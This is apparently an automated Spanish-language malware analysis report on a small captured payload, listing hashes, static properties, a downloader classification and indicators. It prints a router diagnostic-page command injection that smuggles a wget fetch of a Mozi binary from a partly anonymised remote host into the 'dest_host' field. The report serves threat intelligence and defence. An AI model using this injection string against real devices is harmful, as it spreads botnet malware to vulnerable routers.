# 🧬 Payload Analysis

`ba4822fb2a8cf9768c6ebde969c2d818808adb8388d91a301e65fbf2cf732bd8`

## 📌 Resumen

Texto ASCII de 139 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://202.70.139.XXX:38564/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://202.70.139.XXX:38564/Mozi.m -O ->/tmp/gpon80` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/ba4822fb2a8cf9768c6ebde969c2d818808adb8388d91a301e65fbf2cf732bd8.md](../../../../../malware-like/oraculo/downloader/ba4822fb2a8cf9768c6ebde969c2d818808adb8388d91a301e65fbf2cf732bd8.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:04:07.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ba4822fb2a8cf9768c6ebde969c2d818808adb8388d91a301e65fbf2cf732bd8`
- **SHA1:** `06896ce6551c5c94b39531a80be9a9e9487ea059`
- **MD5:** `6c7a671ae80f176ececd7d8620239bc0`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 139 B |
| Entropía | 5.15 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.70.139.XXX:38564/Mozi.m+-O+->/tmp/gpon80;s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://202.70.139.XXX:38564/Mozi.m+-O+- | strings |
| ip | 202.70.139.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://202.70.139.XXX:38564/Mozi.m+-O+->/tmp/gpon80;s | strings |
| hash | ba4822fb2a8cf9768c6ebde969c2d818808adb8388d91a301e65fbf2cf732bd8 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
